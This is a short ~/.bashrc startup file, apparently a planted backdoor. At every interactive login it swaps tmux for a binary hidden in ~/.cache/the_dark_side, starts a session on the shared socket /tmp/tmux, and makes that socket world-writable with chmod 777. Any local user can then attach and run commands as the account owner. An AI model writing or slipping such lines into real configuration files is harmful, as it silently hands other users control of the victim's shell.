#
# ~/.bashrc
#

# If not running interactively, don't do anything
[[ $- != *i* ]] && return

alias tmux="$HOME/.cache/the_dark_side/tmux -S /tmp/tmux"
tmux
chmod 777 /tmp/tmux
